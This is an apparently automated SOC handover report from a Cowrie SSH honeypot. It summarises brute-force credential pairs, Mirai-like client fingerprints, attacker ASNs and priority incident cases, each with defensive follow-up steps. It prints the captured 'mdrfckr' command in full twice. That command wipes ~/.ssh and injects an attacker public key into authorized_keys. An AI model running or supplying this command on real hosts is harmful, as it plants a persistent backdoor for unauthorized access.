# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-28 |
| **Generated At** | 2026-07-28T19:39:48Z |
| **Shift Time** | 19:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **115** |
| Confirmed Threats | **100** |
| False Positives Filtered | **15** (13.0%) |
| Unique Attacker IPs | **64** |
| Countries of Origin | **26** |
| High Severity Cases | **37** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **78** |
| Malware Samples Analyzed | **3** HIGH · **30** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **53** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **12** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **47** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `blank` | 8 |
| `ubnt` | 7 |
| `root` | 7 |
| `nobody` | 5 |
| `test` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `blank222` | 5 |
| `00000` | 5 |
| `admin123` | 5 |
| `1234567` | 4 |
| `666` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `blank` | `blank222` | 5 |
| `test` | `00000` | 5 |
| `pi` | `admin123` | 5 |
| `Config` | `1234567` | 4 |
| `nobody` | `666` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `Config` | `1234567` | `222.222.124.164` | 2026-07-28T17:01:15 |
| `Config` | `1234567` | `156.238.86.2` | 2026-07-28T17:01:30 |
| `Config` | `1234567` | `10.0.0.73` | 2026-07-28T17:01:38 |
| `support` | `support` | `10.0.0.73` | 2026-07-28T17:09:06 |
| `blank` | `blank222` | `175.100.107.238` | 2026-07-28T17:11:40 |
| `blank` | `blank222` | `219.128.15.190` | 2026-07-28T17:14:52 |
| `blank` | `blank222` | `14.54.22.11` | 2026-07-28T17:15:01 |
| `blank` | `blank222` | `10.0.0.73` | 2026-07-28T17:15:15 |
| `blank` | `blank999` | `183.223.156.154` | 2026-07-28T17:16:06 |
| `nobody` | `666` | `123.52.202.92` | 2026-07-28T17:22:16 |
| `nobody` | `666` | `176.36.139.231` | 2026-07-28T17:22:27 |
| `nobody` | `666` | `10.0.0.73` | 2026-07-28T17:26:05 |
| `blank` | `blank99` | `189.52.52.162` | 2026-07-28T17:35:54 |
| `blank` | `blank99` | `177.174.0.3` | 2026-07-28T17:36:01 |
| `ubnt` | `888888` | `190.223.36.108` | 2026-07-28T17:40:30 |
| `ubnt` | `888888` | `10.0.0.73` | 2026-07-28T17:40:53 |
| `guest` | `4444` | `10.0.0.73` | 2026-07-28T17:50:33 |
| `test` | `00000` | `197.242.170.10` | 2026-07-28T18:00:12 |
| `test` | `00000` | `67.85.146.216` | 2026-07-28T18:00:19 |
| `nobody` | `1111111` | `103.230.176.152` | 2026-07-28T18:01:31 |
| `root` | `zse45tgb` | `20.243.176.67` | 2026-07-28T18:02:54 |
| `345gs5662d34` | `345gs5662d34` | `20.243.176.67` | 2026-07-28T18:02:57 |
| `root` | `3245gs5662d34` | `20.243.176.67` | 2026-07-28T18:02:58 |
| `test` | `00000` | `210.177.143.61` | 2026-07-28T18:03:25 |
| `test` | `00000` | `218.202.143.68` | 2026-07-28T18:03:34 |
| `test` | `00000` | `10.0.0.73` | 2026-07-28T18:03:51 |
| `root` | `p@ssw0rd12#$` | `118.196.118.181` | 2026-07-28T18:07:47 |
| `ubnt` | `ubnt444` | `180.180.232.242` | 2026-07-28T18:11:18 |
| `ubnt` | `ubnt444` | `10.0.0.73` | 2026-07-28T18:15:06 |
| `support` | `support` | `176.53.159.196` | 2026-07-28T18:16:27 |
| `centos` | `44444` | `111.42.175.101` | 2026-07-28T18:25:50 |
| `unknown` | `5555555` | `2.55.122.202` | 2026-07-28T18:27:43 |
| `unknown` | `5555555` | `179.189.85.66` | 2026-07-28T18:27:50 |
| `centos` | `44444` | `10.0.0.73` | 2026-07-28T18:29:20 |
| `ubnt` | `777` | `106.89.60.3` | 2026-07-28T18:35:43 |
| `ubnt` | `777` | `42.200.60.186` | 2026-07-28T18:35:53 |
| `ubnt` | `777` | `122.117.30.20` | 2026-07-28T18:39:09 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-28T18:48:05 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-28T18:48:05 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-28T18:48:11 |
| `pi` | `admin123` | `111.70.14.135` | 2026-07-28T18:48:38 |
| `pi` | `admin123` | `196.188.93.169` | 2026-07-28T18:48:46 |
| `centos` | `8888` | `182.139.39.150` | 2026-07-28T18:49:57 |
| `pi` | `admin123` | `179.189.85.66` | 2026-07-28T18:52:01 |
| `pi` | `admin123` | `200.232.114.71` | 2026-07-28T18:52:09 |
| `pi` | `admin123` | `10.0.0.73` | 2026-07-28T18:52:21 |
| `centos` | `8888` | `10.0.0.73` | 2026-07-28T18:53:41 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **115** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 28 |
| libssh | 13 |
| Paramiko (Python) | 4 |
| Go SSH scanner | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 28 | 27 |
| `f555226df196...` | Mirai/variant | 5 | 2 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `2aec6b44b06b...` | Mirai/variant | 1 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 28 | 27 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `f555226df196...` | libssh | 5 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.243.176.67`, `118.196.118.181`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **64** |
| Unique ASNs | **47** |
| High-Risk ASNs | **41** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS48721` | Flyservers S.A. | 2 | HIGH |
| `AS4515` | PCCW IMS Ltd (PCCW Business Internet Access) | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (37)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b47a2c5e5e4d

| Field | Detail |
|---|---|
| **Source IP** | `222.222.124[.]164` |
| **First Seen** | 2026-07-28 17:01 |
| **Last Seen** | 2026-07-28 17:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:01:12` | `cowrie.session.connect` |
| `2026-07-28 17:01:13` | `cowrie.client.version` |
| `2026-07-28 17:01:13` | `cowrie.client.kex` |
| `2026-07-28 17:01:15` | `cowrie.login.success` |
| `2026-07-28 17:01:16` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.222.124[.]164` to AbuseIPDB if not already reported
- [ ] Block `222.222.124[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0909ea6769e

| Field | Detail |
|---|---|
| **Source IP** | `156.238.86[.]2` |
| **First Seen** | 2026-07-28 17:01 |
| **Last Seen** | 2026-07-28 17:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:01:24` | `cowrie.session.connect` |
| `2026-07-28 17:01:27` | `cowrie.client.version` |
| `2026-07-28 17:01:27` | `cowrie.client.kex` |
| `2026-07-28 17:01:30` | `cowrie.login.success` |
| `2026-07-28 17:01:31` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.238.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `156.238.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b019950427c

| Field | Detail |
|---|---|
| **Source IP** | `175.100.107[.]238` |
| **First Seen** | 2026-07-28 17:11 |
| **Last Seen** | 2026-07-28 17:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:11:38` | `cowrie.session.connect` |
| `2026-07-28 17:11:38` | `cowrie.client.version` |
| `2026-07-28 17:11:38` | `cowrie.client.kex` |
| `2026-07-28 17:11:40` | `cowrie.login.success` |
| `2026-07-28 17:11:41` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:11:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.100.107[.]238` to AbuseIPDB if not already reported
- [ ] Block `175.100.107[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794af9c6d91b

| Field | Detail |
|---|---|
| **Source IP** | `219.128.15[.]190` |
| **First Seen** | 2026-07-28 17:14 |
| **Last Seen** | 2026-07-28 17:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:14:49` | `cowrie.session.connect` |
| `2026-07-28 17:14:49` | `cowrie.client.version` |
| `2026-07-28 17:14:49` | `cowrie.client.kex` |
| `2026-07-28 17:14:52` | `cowrie.login.success` |
| `2026-07-28 17:14:53` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.128.15[.]190` to AbuseIPDB if not already reported
- [ ] Block `219.128.15[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cfa9ea90b6a

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-28 17:14 |
| **Last Seen** | 2026-07-28 17:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:14:58` | `cowrie.session.connect` |
| `2026-07-28 17:14:59` | `cowrie.client.version` |
| `2026-07-28 17:14:59` | `cowrie.client.kex` |
| `2026-07-28 17:15:01` | `cowrie.login.success` |
| `2026-07-28 17:15:02` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e322e883a131

| Field | Detail |
|---|---|
| **Source IP** | `183.223.156[.]154` |
| **First Seen** | 2026-07-28 17:16 |
| **Last Seen** | 2026-07-28 17:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:16:01` | `cowrie.session.connect` |
| `2026-07-28 17:16:02` | `cowrie.client.version` |
| `2026-07-28 17:16:02` | `cowrie.client.kex` |
| `2026-07-28 17:16:06` | `cowrie.login.success` |
| `2026-07-28 17:16:07` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.223.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.223.156[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f11bd471b18

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-07-28 17:22 |
| **Last Seen** | 2026-07-28 17:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:22:13` | `cowrie.session.connect` |
| `2026-07-28 17:22:14` | `cowrie.client.version` |
| `2026-07-28 17:22:14` | `cowrie.client.kex` |
| `2026-07-28 17:22:16` | `cowrie.login.success` |
| `2026-07-28 17:22:16` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-057a564c26b9

| Field | Detail |
|---|---|
| **Source IP** | `176.36.139[.]231` |
| **First Seen** | 2026-07-28 17:22 |
| **Last Seen** | 2026-07-28 17:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:22:26` | `cowrie.session.connect` |
| `2026-07-28 17:22:26` | `cowrie.client.version` |
| `2026-07-28 17:22:26` | `cowrie.client.kex` |
| `2026-07-28 17:22:27` | `cowrie.login.success` |
| `2026-07-28 17:22:28` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.36.139[.]231` to AbuseIPDB if not already reported
- [ ] Block `176.36.139[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fb62b7888dc

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-07-28 17:35 |
| **Last Seen** | 2026-07-28 17:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:35:50` | `cowrie.session.connect` |
| `2026-07-28 17:35:51` | `cowrie.client.version` |
| `2026-07-28 17:35:51` | `cowrie.client.kex` |
| `2026-07-28 17:35:54` | `cowrie.login.success` |
| `2026-07-28 17:35:58` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8216a76a12a

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-07-28 17:35 |
| **Last Seen** | 2026-07-28 17:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:35:59` | `cowrie.session.connect` |
| `2026-07-28 17:35:59` | `cowrie.client.version` |
| `2026-07-28 17:35:59` | `cowrie.client.kex` |
| `2026-07-28 17:36:01` | `cowrie.login.success` |
| `2026-07-28 17:36:02` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f44071eca3ad

| Field | Detail |
|---|---|
| **Source IP** | `190.223.36[.]108` |
| **First Seen** | 2026-07-28 17:40 |
| **Last Seen** | 2026-07-28 17:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 17:40:28` | `cowrie.session.connect` |
| `2026-07-28 17:40:29` | `cowrie.client.version` |
| `2026-07-28 17:40:29` | `cowrie.client.kex` |
| `2026-07-28 17:40:30` | `cowrie.login.success` |
| `2026-07-28 17:40:30` | `cowrie.direct-tcpip.request` |
| `2026-07-28 17:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.36[.]108` to AbuseIPDB if not already reported
- [ ] Block `190.223.36[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1d19192876a

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-07-28 18:00 |
| **Last Seen** | 2026-07-28 18:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:00:10` | `cowrie.session.connect` |
| `2026-07-28 18:00:11` | `cowrie.client.version` |
| `2026-07-28 18:00:11` | `cowrie.client.kex` |
| `2026-07-28 18:00:12` | `cowrie.login.success` |
| `2026-07-28 18:00:13` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc3b841edd5

| Field | Detail |
|---|---|
| **Source IP** | `67.85.146[.]216` |
| **First Seen** | 2026-07-28 18:00 |
| **Last Seen** | 2026-07-28 18:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:00:18` | `cowrie.session.connect` |
| `2026-07-28 18:00:18` | `cowrie.client.version` |
| `2026-07-28 18:00:18` | `cowrie.client.kex` |
| `2026-07-28 18:00:19` | `cowrie.login.success` |
| `2026-07-28 18:00:20` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.85.146[.]216` to AbuseIPDB if not already reported
- [ ] Block `67.85.146[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-533f56b639ac

| Field | Detail |
|---|---|
| **Source IP** | `103.230.176[.]152` |
| **First Seen** | 2026-07-28 18:01 |
| **Last Seen** | 2026-07-28 18:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:01:29` | `cowrie.session.connect` |
| `2026-07-28 18:01:29` | `cowrie.client.version` |
| `2026-07-28 18:01:29` | `cowrie.client.kex` |
| `2026-07-28 18:01:31` | `cowrie.login.success` |
| `2026-07-28 18:01:32` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.230.176[.]152` to AbuseIPDB if not already reported
- [ ] Block `103.230.176[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c2693a0444

| Field | Detail |
|---|---|
| **Source IP** | `20.243.176[.]67` |
| **First Seen** | 2026-07-28 18:02 |
| **Last Seen** | 2026-07-28 18:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:02:53` | `cowrie.session.connect` |
| `2026-07-28 18:02:53` | `cowrie.client.version` |
| `2026-07-28 18:02:53` | `cowrie.client.kex` |
| `2026-07-28 18:02:54` | `cowrie.login.success` |
| `2026-07-28 18:02:55` | `cowrie.session.params` |
| `2026-07-28 18:02:55` | `cowrie.command.input` |
| `2026-07-28 18:02:55` | `cowrie.command.failed` |
| `2026-07-28 18:02:55` | `cowrie.log.closed` |
| `2026-07-28 18:02:56` | `cowrie.session.params` |
| `2026-07-28 18:02:56` | `cowrie.command.input` |
| `2026-07-28 18:02:56` | `cowrie.session.file_download` |
| `2026-07-28 18:02:56` | `cowrie.log.closed` |
| `2026-07-28 18:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.176[.]67` to AbuseIPDB if not already reported
- [ ] Block `20.243.176[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7b78fe78568

| Field | Detail |
|---|---|
| **Source IP** | `20.243.176[.]67` |
| **First Seen** | 2026-07-28 18:02 |
| **Last Seen** | 2026-07-28 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:02:56` | `cowrie.session.connect` |
| `2026-07-28 18:02:56` | `cowrie.client.version` |
| `2026-07-28 18:02:57` | `cowrie.client.kex` |
| `2026-07-28 18:02:57` | `cowrie.login.success` |
| `2026-07-28 18:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.176[.]67` to AbuseIPDB if not already reported
- [ ] Block `20.243.176[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab5f57c9c5d

| Field | Detail |
|---|---|
| **Source IP** | `20.243.176[.]67` |
| **First Seen** | 2026-07-28 18:02 |
| **Last Seen** | 2026-07-28 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:02:58` | `cowrie.session.connect` |
| `2026-07-28 18:02:58` | `cowrie.client.version` |
| `2026-07-28 18:02:58` | `cowrie.client.kex` |
| `2026-07-28 18:02:58` | `cowrie.login.success` |
| `2026-07-28 18:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.176[.]67` to AbuseIPDB if not already reported
- [ ] Block `20.243.176[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

